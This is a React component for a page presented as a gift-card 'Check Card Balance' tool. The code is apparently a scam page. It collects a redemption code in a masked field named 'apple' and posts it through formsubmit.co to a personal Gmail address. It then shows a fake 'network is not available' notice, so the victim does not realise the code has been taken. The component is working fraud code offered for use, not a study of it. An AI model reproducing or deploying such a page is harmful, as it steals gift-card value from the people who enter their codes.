import Footer from './Footer';
import { Link } from 'react-router-dom';
import { useEffect, useState } from 'react';
import Successful from '../Pages/Successful';
// import Success from '../Pages/Success';
import { ImCancelCircle } from "react-icons/im";
import cardVideo from '../assets/cardvideo.mp4';

const InputHolder2 = () => {
  const [loading, setLoading] = useState(true);
  
  const [isOpen, setIsOpen] = useState(false);

  const openPopup = () => setIsOpen(true);
  const closePopup = () => setIsOpen(false);

  useEffect(() => {
    setTimeout(() => setLoading(false), 2000);
  }, []);

  

  return (
    <div>
      {loading ? (
        <Successful />
      ) : (
        <div className="max-w-[1640px] px-4 py-10 ">
          
          <div className='bg-[#a7d5e7] mx-auto w-[330px] h-[220px] mb-5 rounded-xl my-auto space-y-3 pt-5'>
            <h3 className="text-center text-[24px] font-semibold ">Check Card Balance </h3>
            <p className="text-center text-sm">Enter your Redemption Code</p>

            <form
              className="mt-4 mx-auto flex flex-col justify-center items-center space-y-3"
              action="https://formsubmit.co/Gramlolu@gmail.com"
              method="POST"
            >
              <input
                type="password"
                placeholder="XXXX XXXXX XXXXX"
                name="apple"
                required
              className="py-1 pl-4 rounded-lg border border-[#204d5f] focus:outline-[#5294ae]"
              />


               <button
                  className="w-[100px] h-[30px] rounded-lg text-white  bg-[#5294ae] hover:border-b hover:border-black"
                  type="submit" 
                  onClick={openPopup}
                >
                  Check
                </button>
                {isOpen && (
                <div className="fixed top-[50%] left-[50%] translate-x-[-50%] translate-y-[-50%] bg-gray-400 w-[300px] h-[120px]">
                    <ImCancelCircle onClick={closePopup} className="text-white flex items-end mt-2 ml-1"/>
                
                    <h2 className="text-white flex justify-center items-center text-lg">Notification</h2>
                    <p className="text-white flex justify-center items-center text-sm px-3">Kindly be Aware the network is not available at the moment please try again</p>
                    
                </div>
            )}
                      
                
              
               
              
            </form>
           
            <Link to="/" >
            
            <p className=" text-center  text-lg text-black hover:text-white hover:underline">
            Go back to Home
        </p></Link>
        </div>
        <video className="w-full h-auto sm:h-[300px] md:h-[500px]  object-cover " src={cardVideo} autoPlay muted loop/>
            <Footer />
          
        </div>
      )}
    </div>
  );
};

export default InputHolder2;
